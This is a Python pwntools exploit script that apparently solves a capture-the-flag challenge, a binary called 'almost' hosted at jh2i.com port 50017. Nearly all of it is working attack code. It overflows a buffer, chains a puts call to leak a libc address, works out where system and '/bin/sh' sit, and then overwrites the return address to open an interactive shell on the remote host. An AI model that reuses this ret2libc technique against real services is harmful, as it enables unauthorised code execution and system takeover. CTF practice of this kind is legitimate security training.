#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['gnome-terminal','-x','sh','-c']

#Setting up pwn env
BIN_NAME = './almost'
DEBUG = False
LOCAL = False
LIBC = ''
HOST =  'jh2i.com'
PORT = 50017
ARCH_64 = False
if LIBC:
    LIBC_ELF = ELF(LIBC)

elf = ELF(BIN_NAME)

#Exploit goes here
def exploit(io):
    io.clean()
    io.sendline("A" * 64)
    io.clean()
    io.sendline("A" * 64)
    io.clean()
    puts_plt = elf.sym['puts']
    puts_got = elf.got['puts']
    diff = p32(puts_plt) + p32(elf.sym['main']) + p32(puts_got)
    payload = "A" * 16 + diff
    io.sendline(payload)
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    io.recvline()
    puts_leak = u32(io.recvline()[:4])
    libc_offset = puts_leak - 0x0673d0
    system = libc_offset + 0x03cd80
    bin_sh = libc_offset + 0x17bb8f
    log.info('Puts leak: {}'.format(hex(puts_leak)))
    log.info('libc     : {}'.format(hex(libc_offset)))
    log.info('system   : {}'.format(hex(system)))
    log.info('bin/sh   : {}'.format(hex(bin_sh)))
    io.sendline("A" * 64)
    io.clean()
    io.sendline("A" * 64)
    io.clean()
    payload = "A" * 16 + p32(system) + "AAAA" + p32(bin_sh)
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    if ARCH_64:
        context.update(arch='amd64')
    else:
        context.update(arch='i386')

    if not LOCAL:
        DEBUG = False
        io = remote(HOST, PORT)
    else:
        LOCAL = True
        io = process(BIN_NAME)
        if DEBUG:
            gdb.attach(io)
            log.info('Process Started')
    exploit(io)
